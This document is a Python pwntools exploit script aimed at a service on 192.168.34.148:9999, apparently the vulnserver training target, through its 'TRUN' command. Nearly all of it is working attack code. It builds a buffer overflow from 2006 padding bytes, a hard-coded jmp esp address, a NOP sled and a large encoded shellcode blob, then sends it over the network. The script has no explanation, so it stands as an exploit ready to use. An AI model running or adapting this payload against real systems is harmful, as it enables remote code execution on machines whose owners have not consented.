#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 192.168.34.148 --port 9999
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '192.168.34.148'
port = int(args.PORT or 9999)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

jmpesp = '\xaf\x11\x50\x62'

shellcode =  ""
shellcode += "\xba\x9e\x18\xdb\xea\xdb\xd7\xd9\x74\x24\xf4"
shellcode += "\x5d\x31\xc9\xb1\x52\x83\xc5\x04\x31\x55\x0e"
shellcode += "\x03\xcb\x16\x39\x1f\x0f\xce\x3f\xe0\xef\x0f"
shellcode += "\x20\x68\x0a\x3e\x60\x0e\x5f\x11\x50\x44\x0d"
shellcode += "\x9e\x1b\x08\xa5\x15\x69\x85\xca\x9e\xc4\xf3"
shellcode += "\xe5\x1f\x74\xc7\x64\x9c\x87\x14\x46\x9d\x47"
shellcode += "\x69\x87\xda\xba\x80\xd5\xb3\xb1\x37\xc9\xb0"
shellcode += "\x8c\x8b\x62\x8a\x01\x8c\x97\x5b\x23\xbd\x06"
shellcode += "\xd7\x7a\x1d\xa9\x34\xf7\x14\xb1\x59\x32\xee"
shellcode += "\x4a\xa9\xc8\xf1\x9a\xe3\x31\x5d\xe3\xcb\xc3"
shellcode += "\x9f\x24\xeb\x3b\xea\x5c\x0f\xc1\xed\x9b\x6d"
shellcode += "\x1d\x7b\x3f\xd5\xd6\xdb\x9b\xe7\x3b\xbd\x68"
shellcode += "\xeb\xf0\xc9\x36\xe8\x07\x1d\x4d\x14\x83\xa0"
shellcode += "\x81\x9c\xd7\x86\x05\xc4\x8c\xa7\x1c\xa0\x63"
shellcode += "\xd7\x7e\x0b\xdb\x7d\xf5\xa6\x08\x0c\x54\xaf"
shellcode += "\xfd\x3d\x66\x2f\x6a\x35\x15\x1d\x35\xed\xb1"
shellcode += "\x2d\xbe\x2b\x46\x51\x95\x8c\xd8\xac\x16\xed"
shellcode += "\xf1\x6a\x42\xbd\x69\x5a\xeb\x56\x69\x63\x3e"
shellcode += "\xf8\x39\xcb\x91\xb9\xe9\xab\x41\x52\xe3\x23"
shellcode += "\xbd\x42\x0c\xee\xd6\xe9\xf7\x79\x19\x45\xd5"
shellcode += "\xf3\xf1\x94\x19\x23\x0d\x10\xff\x41\x01\x74"
shellcode += "\xa8\xfd\xb8\xdd\x22\x9f\x45\xc8\x4f\x9f\xce"
shellcode += "\xff\xb0\x6e\x27\x75\xa2\x07\xc7\xc0\x98\x8e"
shellcode += "\xd8\xfe\xb4\x4d\x4a\x65\x44\x1b\x77\x32\x13"
shellcode += "\x4c\x49\x4b\xf1\x60\xf0\xe5\xe7\x78\x64\xcd"
shellcode += "\xa3\xa6\x55\xd0\x2a\x2a\xe1\xf6\x3c\xf2\xea"
shellcode += "\xb2\x68\xaa\xbc\x6c\xc6\x0c\x17\xdf\xb0\xc6"
shellcode += "\xc4\x89\x54\x9e\x26\x0a\x22\x9f\x62\xfc\xca"
shellcode += "\x2e\xdb\xb9\xf5\x9f\x8b\x4d\x8e\xfd\x2b\xb1"
shellcode += "\x45\x46\x5b\xf8\xc7\xef\xf4\xa5\x92\xad\x98"
shellcode += "\x55\x49\xf1\xa4\xd5\x7b\x8a\x52\xc5\x0e\x8f"
shellcode += "\x1f\x41\xe3\xfd\x30\x24\x03\x51\x30\x6d"

exploit = 'A' * 2006 + jmpesp + '\x90' * 32 + shellcode

info(io.recv(4096))
io.sendline(f'TRUN .{exploit}')
